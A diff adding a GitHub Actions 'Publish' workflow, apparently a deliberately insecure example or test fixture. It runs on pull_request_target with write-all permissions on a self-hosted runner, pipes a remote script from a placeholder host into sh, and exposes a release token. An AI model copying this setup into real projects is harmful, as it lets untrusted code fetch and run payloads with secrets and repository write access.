@@ -1,0 +1,23 @@
+name: Publish
+
+on:
+  pull_request_target:
+  workflow_dispatch:
+
+permissions: write-all
+
+jobs:
+  publish:
+    runs-on: self-hosted
+    steps:
+      - uses: actions/checkout@main
+      - name: Download helper
+        run: curl -fsSL https://example.invalid/helper.sh | sh
+      - name: Publish artifact
+        env:
+          RELEASE_TOKEN: ${{ secrets.RELEASE_TOKEN }}
+        run: echo "publishing to production"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: release-output
+          path: dist/
